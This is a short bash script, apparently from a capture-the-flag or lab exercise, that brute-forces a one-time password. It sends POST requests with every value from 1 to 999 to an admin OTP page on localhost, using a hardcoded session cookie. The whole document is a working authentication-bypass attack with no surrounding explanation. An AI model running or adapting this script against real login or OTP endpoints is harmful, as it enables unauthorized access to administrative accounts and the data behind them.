#!/bin/bash

PHPSESSID="41507aebf6a9bf5e2d4d8a16a568539e"
for DATA in $(seq 999);do
curl -X POST "http://localhost:1337/admin/otp.php" \
     -b "PHPSESSID=${PHPSESSID}" \
     -d "OTP=${DATA}"
echo "DATA=$DATA"
done
